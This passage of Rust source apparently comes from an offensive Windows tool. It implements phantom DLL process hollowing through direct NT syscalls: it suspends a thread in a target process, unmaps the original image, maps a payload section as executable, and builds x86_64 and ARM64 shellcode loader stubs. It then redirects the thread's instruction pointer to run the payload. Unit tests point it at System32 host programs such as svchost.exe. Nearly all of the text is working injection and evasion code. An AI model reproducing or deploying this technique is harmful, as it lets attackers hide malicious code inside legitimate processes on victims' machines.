                NT_THREAD_INJECT_ACCESS as u64,
                0u64,
                h_process as u64,
                start_addr as u64,
                0u64,
                NT_THREAD_SUSPENDED as u64,
                0u64,
                0u64,
                0u64,
                0u64,
            )
            .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtCreateThreadEx SSN: {e}"))?;
            if s < 0 || new_thread.is_null() {
                close_handle!(h_process);
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow_into_process: NtCreateThreadEx NTSTATUS {:#010x}",
                    s as u32
                ));
            }
            new_thread
        }
    };

    // ── Phase 3: Replace target image with phantom section ──────────────
    //
    // Read PEB, unmap original image, map phantom section, fix up.

    // Get PEB address via NtQueryInformationProcess.
    let mut pbi = [0u8; 48];
    let mut ret_len: u32 = 0;
    let s = crate::syscall!(
        "NtQueryInformationProcess",
        h_process as u64,
        0u64, // ProcessBasicInformation
        pbi.as_mut_ptr() as u64,
        48u64,
        &mut ret_len as *mut _ as u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtQueryInformationProcess SSN: {e}"))?;
    if s < 0 || ret_len < 16 {
        close_handle!(h_thread);
        close_handle!(h_process);
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NtQueryInformationProcess NTSTATUS {:#010x}",
            s as u32
        ));
    }
    let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
    if peb_addr == 0 {
        close_handle!(h_thread);
        close_handle!(h_process);
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: PEB address is NULL"
        ));
    }
    let peb_ptr = peb_addr as *const u8;

    // Read PEB.ImageBaseAddress (offset 0x10).
    let mut remote_image_base: usize = 0;
    if !nt_read_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &mut remote_image_base as *mut _ as *mut c_void,
        std::mem::size_of::<usize>(),
    ) {
        close_handle!(h_thread);
        close_handle!(h_process);
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: failed to read PEB.ImageBaseAddress"
        ));
    }

    // Unmap the target's original image.
    if remote_image_base != 0 {
        let us = crate::syscall!(
            "NtUnmapViewOfSection",
            h_process as u64,
            remote_image_base as u64,
        )
        .unwrap_or(-1);
        if us < 0 {
            tracing::warn!(
                "phantom_dll_hollow_into_process: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                us as u32
            );
        }
    } else {
        tracing::warn!(
            "phantom_dll_hollow_into_process: remote_image_base is NULL; skipping unmap"
        );
    }

    // Map the phantom section into the target process.
    let mut remote_base: *mut c_void = remote_image_base as *mut c_void;
    let mut remote_view_size: usize = 0;
    let map_result = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        h_process as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        std::ptr::null_mut::<u64>() as u64,
        &mut remote_view_size as *mut _ as u64,
        1u64,
        0u64,
        PAGE_EXECUTE_READWRITE as u64,
    );
    let mapped_ok = match map_result {
        Ok(st) if st >= 0 && !remote_base.is_null() => true,
        _ => false,
    };

    if !mapped_ok {
        // Retry without specifying a base address.
        remote_base = std::ptr::null_mut();
        remote_view_size = 0;
        let retry_result = crate::syscall!(
            "NtMapViewOfSection",
            h_section as u64,
            h_process as u64,
            &mut remote_base as *mut _ as u64,
            0u64,
            0u64,
            std::ptr::null_mut::<u64>() as u64,
            &mut remote_view_size as *mut _ as u64,
            1u64,
            0u64,
            PAGE_EXECUTE_READWRITE as u64,
        );
        match retry_result {
            Ok(st) if st >= 0 && !remote_base.is_null() => {}
            Ok(st) => {
                close_handle!(h_thread);
                close_handle!(h_process);
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow_into_process: NtMapViewOfSection(remote) NTSTATUS {:#010x}",
                    st as u32
                ));
            }
            Err(e) => {
                close_handle!(h_thread);
                close_handle!(h_process);
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow_into_process: NtMapViewOfSection(remote) failed: {e}"
                ));
            }
        }
    }
    let remote_base_usize = remote_base as usize;

    // Unmap local view.
    let _ = crate::syscall!(
        "NtUnmapViewOfSection",
        NT_CURRENT_PROCESS as u64,
        local_base as u64,
    );

    // Close section handle.
    close_handle!(h_section);

    // Apply relocations.
    let delta = remote_base_usize as isize - preferred_base as isize;
    if delta != 0 {
        apply_relocations_remote(h_process, remote_base_usize, nt, payload, delta)?;
    }

    // Rebuild IAT.
    fix_iat_remote(h_process, remote_base_usize, nt, payload)?;

    // Apply per-section protections.
    apply_section_protections(h_process, remote_base_usize, nt);

    // Flush instruction cache.
    let _ = crate::syscall!(
        "NtFlushInstructionCache",
        h_process as u64,
        remote_base as u64,
        (*nt).OptionalHeader.SizeOfImage as u64,
    );

    // Update PEB.ImageBaseAddress.
    if !nt_write_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &remote_base_usize as *const _ as *const c_void,
        std::mem::size_of::<usize>(),
    ) {
        tracing::warn!("phantom_dll_hollow_into_process: failed to update PEB.ImageBaseAddress");
    }

    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
    //
    // The Windows loader normally:
    //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
    //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
    //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
    //
    // Since we bypass the loader entirely, we build a position-independent
    // shellcode stub that performs this missing work before jumping to the
    // payload entry point with the correct DllMain calling convention.

    // Collect TLS callbacks from the PE's TLS directory.
    let mut tls_callback_vas: Vec<usize> = Vec::new();
    {
        const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
        let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
            let tls_rva = tls_dir.VirtualAddress as usize;
            if tls_rva + 40 <= image_size {
                let tls_offset = rva_to_file_offset(payload, tls_rva);
                if tls_offset + 32 <= payload.len() {
                    let callbacks_va_raw = u64::from_le_bytes(
                        payload[tls_offset + 24..tls_offset + 32]
                            .try_into()
                            .unwrap_or([0u8; 8]),
                    ) as usize;
                    if callbacks_va_raw != 0 {
                        let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
                        let callbacks_file_offset = rva_to_file_offset(payload, callbacks_rva);
                        let mut remaining = 32u32;
                        let mut slot_idx = 0usize;
                        loop {
                            if remaining == 0 {
                                break;
                            }
                            remaining -= 1;
                            let slot_offset = callbacks_file_offset + slot_idx * 8;
                            if slot_offset + 8 > payload.len() {
                                break;
                            }
                            let cb_va_raw = u64::from_le_bytes(
                                payload[slot_offset..slot_offset + 8]
                                    .try_into()
                                    .unwrap_or([0u8; 8]),
                            ) as usize;
                            if cb_va_raw == 0 {
                                break;
                            }
                            let cb_va = (cb_va_raw as isize + delta) as usize;
                            if cb_va >= remote_base_usize && cb_va < remote_base_usize + image_size
                            {
                                tls_callback_vas.push(cb_va);
                            }
                            slot_idx += 1;
                        }
                    }
                }
            }
        }
    }

    // Find .pdata section for exception unwinding registration.
    let (pdata_va, pdata_count) = {
        let mut result = (0usize, 0u32);
        const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
        let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
            let va = remote_base_usize + exc_dir.VirtualAddress as usize;
            let count = (exc_dir.Size as usize / 12) as u32;
            if count > 0 {
                result = (va, count);
            }
        }
        result
    };

    // Resolve RtlAddFunctionTable from ntdll via PEB-walk.
    let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
        resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
    } else {
        0
    };

    let needs_stub =
        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);

    // Build the loader stub if needed, otherwise jump directly to entry point.
    let thread_start_va = if needs_stub {
        let mut stub: Vec<u8> = Vec::with_capacity(256);

        #[cfg(target_arch = "x86_64")]
        {
            // ABI prologue: reserve 32 bytes of shadow space.
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

            // .pdata registration.
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, pdata_va
                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                stub.extend_from_slice(&[0xBA]); // mov edx, entry_count
                stub.extend_from_slice(&pdata_count.to_le_bytes());
                stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, remote_base
                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, RtlAddFunctionTable
                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
            }

            // TLS callback invocations: DllMain convention (hinstDLL, DLL_PROCESS_ATTACH, NULL).
            for &cb_va in &tls_callback_vas {
                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
                stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, cb_va
                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
            }

            // DllMain entry point call: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            let entry_va = (remote_base_usize + entry_point_rva) as u64;
            stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
            stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
            stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
            stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
            stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, entry_va
            stub.extend_from_slice(&entry_va.to_le_bytes());
            stub.extend_from_slice(&[0xFF, 0xD0]); // call rax

            // ABI epilogue.
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20

            // Infinite halt after DllMain returns.
            stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
        }

        #[cfg(target_arch = "aarch64")]
        {
            // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
                push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
                push_arm64_mov_imm64(&mut stub, 2, remote_base_usize as u64);
                push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
                push_arm64_blr(&mut stub, 16);
            }

            // TLS callbacks with DllMain convention.
            for &cb_va in &tls_callback_vas {
                push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base_usize as u64);
            }

            // DllMain entry: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            let entry_va = (remote_base_usize + entry_point_rva) as u64;
            push_arm64_dll_entry_call(&mut stub, entry_va, remote_base_usize as u64);

            // Infinite halt after DllMain returns.
            push_arm64_brk(&mut stub, 0xF000); // BRK #0xF000
        }

        // Allocate RW memory for the stub in the target process.
        let mut stub_mem: *mut c_void = std::ptr::null_mut();
        let mut stub_alloc_size = stub.len();
        let alloc_s = crate::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64,
            &mut stub_mem as *mut _ as u64,
            0u64,
            &mut stub_alloc_size as *mut _ as u64,
            (windows_sys::Win32::System::Memory::MEM_COMMIT
                | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
            crate::win_types::PAGE_READWRITE as u64,
        );
        let alloc_ok = match alloc_s {
            Ok(st) if st >= 0 && !stub_mem.is_null() => true,
            _ => false,
        };
        if !alloc_ok {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtAllocateVirtualMemory for loader stub failed"
            ));
        }

        // Write stub bytes.
        let mut stub_written = 0usize;
        let write_s = crate::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            stub_mem as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut stub_written as *mut _ as u64,
        );
        let write_ok = match write_s {
            Ok(st) if st >= 0 => stub_written == stub.len(),
            _ => false,
        };
        if !write_ok {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtWriteVirtualMemory for loader stub failed"
            ));
        }

        // Make the stub executable (RX).
        let mut prot_base = stub_mem;
        let mut prot_size = stub.len();
        let mut old_prot = 0u32;
        let prot_s = crate::syscall!(
            "NtProtectVirtualMemory",
            h_process as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );
        let prot_ok = match prot_s {
            Ok(st) if st >= 0 => true,
            _ => false,
        };
        if !prot_ok {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtProtectVirtualMemory(RX) for loader stub failed"
            ));
        }

        // Flush instruction cache for the stub.
        let _ = crate::syscall!(
            "NtFlushInstructionCache",
            h_process as u64,
            stub_mem as u64,
            stub.len() as u64,
        );

        tracing::debug!(
            "phantom_dll_hollow_into_process: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
            stub_mem,
            tls_callback_vas.len(),
            pdata_count,
        );

        stub_mem as u64
    } else {
        // No TLS callbacks and no .pdata — set entry point directly.
        (remote_base_usize + entry_point_rva) as u64
    };

    // Set the thread context and resume.
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;

    let get_ctx = crate::syscall!(
        "NtGetContextThread",
        h_thread as u64,
        &mut ctx as *mut _ as u64,
    );
    match get_ctx {
        Ok(st) if st >= 0 => {
            set_context_instruction_pointer(&mut ctx, thread_start_va);
            tracing::debug!(
                "phantom_dll_hollow_into_process: setting thread {} to {:#x}",
                CONTEXT_IP_NAME,
                thread_start_va,
            );

            let set_ctx = crate::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            );
            match set_ctx {
                Ok(st2) if st2 >= 0 => {}
                Ok(st2) => {
                    close_handle!(h_thread);
                    close_handle!(h_process);
                    return Err(anyhow!(
                        "phantom_dll_hollow_into_process: NtSetContextThread NTSTATUS {:#010x}",
                        st2 as u32
                    ));
                }
                Err(e) => {
                    close_handle!(h_thread);
                    close_handle!(h_process);
                    return Err(anyhow!(
                        "phantom_dll_hollow_into_process: NtSetContextThread failed: {}",
                        e
                    ));
                }
            }
        }
        Ok(st) => {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtGetContextThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtGetContextThread failed: {}",
                e
            ));
        }
    }

    // Resume the host thread — execution begins at the loader stub or entry point.
    let resume = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
    match resume {
        Ok(st) if st >= 0 => {}
        Ok(st) => {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtResumeThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "phantom_dll_hollow_into_process: NtResumeThread failed: {}",
                e
            ));
        }
    }

    tracing::info!(
        "phantom_dll_hollow_into_process: phantom DLL ({} bytes) mapped at {:#x} in PID {}",
        payload.len(),
        remote_base_usize,
        pid,
    );

    Ok(PhantomHollowResult {
        process_handle: h_process,
        thread_handle: h_thread,
        phantom_base: remote_base_usize,
    })
}

// ── ARM64 shellcode helpers ──────────────────────────────────────────────────

#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_instruction(stub: &mut Vec<u8>, instruction: u32) {
    stub.extend_from_slice(&instruction.to_le_bytes());
}

/// Emit a `MOVZ`/`MOVK` sequence to load a 64-bit immediate into `reg`.
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_mov_imm64(stub: &mut Vec<u8>, reg: u8, value: u64) {
    debug_assert!(reg < 32);
    let rd = (reg as u32) & 0x1f;
    for halfword in 0..4u32 {
        let imm16 = ((value >> (halfword * 16)) & 0xffff) as u32;
        let opcode = if halfword == 0 {
            0xD280_0000 // MOVZXd
        } else {
            0xF280_0000 // MOVKXd
        };
        push_arm64_instruction(stub, opcode | (halfword << 21) | (imm16 << 5) | rd);
    }
}

/// Emit `BLR xN` (branch with link register to address in register N).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_blr(stub: &mut Vec<u8>, reg: u8) {
    push_arm64_instruction(stub, 0xD63F_0000 | (((reg as u32) & 0x1f) << 5));
}

/// Emit `BR xN` (branch to address in register N, no return).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_br(stub: &mut Vec<u8>, reg: u8) {
    push_arm64_instruction(stub, 0xD61F_0000 | (((reg as u32) & 0x1f) << 5));
}

/// Emit a Windows ARM64 DllMain-style call sequence:
///   x0 = image_base, x1 = DLL_PROCESS_ATTACH (1), x2 = 0 (NULL),
///   x16 = target, BLR x16.
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_dll_entry_call(stub: &mut Vec<u8>, target: u64, image_base: u64) {
    push_arm64_mov_imm64(stub, 0, image_base); // x0 = hinstDLL
    push_arm64_mov_imm64(stub, 1, 1); // x1 = DLL_PROCESS_ATTACH
    push_arm64_mov_imm64(stub, 2, 0); // x2 = lpvReserved = NULL
    push_arm64_mov_imm64(stub, 16, target); // x16 = target address
    push_arm64_blr(stub, 16); // blr x16
}

/// Emit `BRK #imm16` — ARM64 breakpoint (used as infinite halt).
#[cfg(all(windows, target_arch = "aarch64"))]
fn push_arm64_brk(stub: &mut Vec<u8>, imm: u32) {
    // BRK encoding: 0xD4200000 | (imm16 << 5)
    push_arm64_instruction(stub, 0xD420_0000 | ((imm & 0xffff) << 5));
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rva_to_file_offset_headers() {
        // Minimal PE header: MZ + e_lfanew = 0x80.
        // At offset 0x80: PE\0\0 + IMAGE_FILE_HEADER + IMAGE_OPTIONAL_HEADER64.
        let mut buf = vec![0u8; 0x200];
        buf[0] = b'M';
        buf[1] = b'Z';
        // e_lfanew at 0x3C
        buf[0x3C..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        // PE signature
        buf[0x80..0x84].copy_from_slice(b"PE\0\0");
        // Machine at 0x84 (IMAGE_FILE_HEADER +0)
        buf[0x84..0x86].copy_from_slice(&(0x8664u16).to_le_bytes()); // IMAGE_FILE_MACHINE_AMD64
                                                                     // NumberOfSections at 0x86
        buf[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
        // SizeOfOptionalHeader at 0x94
        let opt_header_size = std::mem::size_of::<
            windows_sys::Win32::System::Diagnostics::Debug::IMAGE_OPTIONAL_HEADER6464,
        >();
        buf[0x94..0x96].copy_from_slice(&(opt_header_size as u16).to_le_bytes());
        // Magic at 0x98 (OptionalHeader +0)
        buf[0x98..0x9A].copy_from_slice(&(0x020Bu16).to_le_bytes()); // PE64

        // Section header starts after OptionalHeader.
        let section_offset = 0x80 + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() + opt_header_size;
        let sec =
            &mut buf[section_offset..section_offset + std::mem::size_of::<IMAGE_SECTION_HEADER>()];
        // VirtualAddress at +12
        let va: u32 = 0x1000;
        sec[12..16].copy_from_slice(&va.to_le_bytes());
        // VirtualSize at +8
        let vs: u32 = 0x500;
        sec[8..12].copy_from_slice(&vs.to_le_bytes());
        // PointerToRawData at +20
        let raw: u32 = 0x200;
        sec[20..24].copy_from_slice(&raw.to_le_bytes());
        // SizeOfRawData at +16
        let raw_sz: u32 = 0x200;
        sec[16..20].copy_from_slice(&raw_sz.to_le_bytes());

        // RVA 0x1000 should map to file offset 0x200.
        assert_eq!(rva_to_file_offset(&buf, 0x1000), 0x200);
        // RVA 0x1200 (0x200 into section) should map to 0x400.
        assert_eq!(rva_to_file_offset(&buf, 0x1200), 0x400);
        // RVA 0x50 (header area) maps 1:1.
        assert_eq!(rva_to_file_offset(&buf, 0x50), 0x50);
    }

    #[test]
    fn test_rva_to_file_offset_no_mz() {
        let buf = vec![0u8; 0x100];
        // No MZ header → fallback to identity mapping.
        assert_eq!(rva_to_file_offset(&buf, 0x42), 0x42);
    }

    #[test]
    fn test_dos_to_nt_path() {
        let result = dos_to_nt_path(r"C:\Windows\System32\svchost.exe");
        let expected: Vec<u16> = r"\??\C:\Windows\System32\svchost.exe"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        assert_eq!(result, expected);
    }

    #[test]
    fn test_dos_to_nt_path_already_nt() {
        let result = dos_to_nt_path(r"\??\C:\test.exe");
        let expected: Vec<u16> = r"\??\C:\test.exe"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        assert_eq!(result, expected);
    }

    #[test]
    fn test_host_candidate_paths() {
        let paths = host_candidate_paths();
        assert!(!paths.is_empty());
        // All paths should contain "System32" and end with ".exe".
        for p in &paths {
            assert!(p.contains("System32"));
            assert!(p.ends_with(".exe"));
        }
    }
}
